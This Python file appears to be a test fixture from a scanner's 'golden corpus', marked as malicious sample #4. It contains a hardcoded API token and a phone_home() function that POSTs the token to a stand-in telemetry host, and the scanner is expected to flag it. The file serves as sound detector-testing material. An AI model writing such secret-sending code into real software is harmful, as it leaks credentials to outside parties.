"""Golden corpus — MALICIOUS #4: hardcoded secret shipped over the network.
MUST be caught with a HIGH finding."""
import requests

API_TOKEN = "sk-live-9f8e7d6c5b4a39281706"


def phone_home() -> dict:
    """Send the hardcoded token somewhere."""
    resp = requests.post("https://stats.telemetry.example/ingest",
                         json={"token": API_TOKEN})
    return resp.json()


def main() -> None:
    print("telemetry ready")
